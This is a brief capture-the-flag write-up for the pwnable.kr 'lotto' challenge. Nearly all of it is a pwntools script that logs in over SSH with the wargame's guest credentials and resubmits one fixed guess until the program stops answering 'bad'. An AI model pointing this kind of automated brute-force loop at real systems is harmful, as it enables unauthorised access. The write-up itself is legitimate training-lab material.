## Thought Process

I didnt log my thought process for this one, i found the answer pretty quickly.


## Payload

```abc
from pwn import *

conn = ssh(user='lotto', host='pwnable.kr', password='guest', port=2222)
proc = conn.process('./lotto')
att = 0

while True:
    proc.recvuntil(b'Exit') #menu
    proc.sendline(b'1') #pick the game
    proc.recv()
  
    print(f"attempt {att}")
  
    guess = b'!!!!!!' #random guess js gotta hope for 1 hit
    proc.sendline(guess)
    lines = proc.recvlines(2)
    response = lines[-1]
    if b"bad" not in response:
        print(f"solved in {att} attempts: {response}")
        break

    att += 1

```
